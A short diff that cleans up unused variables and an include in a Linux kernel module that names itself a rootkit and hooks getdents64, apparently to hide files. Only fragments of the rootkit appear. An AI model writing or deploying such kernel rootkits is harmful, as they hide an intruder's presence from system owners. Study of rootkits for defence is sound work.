@@ -6,7 +6,6 @@
 #include <linux/namei.h>
 #include <linux/dirent.h>
 #include <linux/tcp.h>
-#include "ftrace_helper2.h"
 
 
 MODULE_LICENSE("GPL");
@@ -63,7 +62,6 @@ int set_addr_ro(unsigned long _addr) {
 
 static int __init rootkit_enter(void) {
 
-	int err;
 
 	printk(KERN_INFO "rootkit is operating\n");
 
@@ -124,7 +122,6 @@ asmlinkage int new_getdents64(const struct pt_regs *regs)
 	struct linux_dirent64 *dirent_kern, *dirent, *curr_ent, *prev_ent = NULL; 
 	unsigned int len;
 	unsigned long index = 0;
-	unsigned short reclen;
 	long error;
 
 	dirent = (struct linux_dirent64*)(regs->si); // struct from userspace
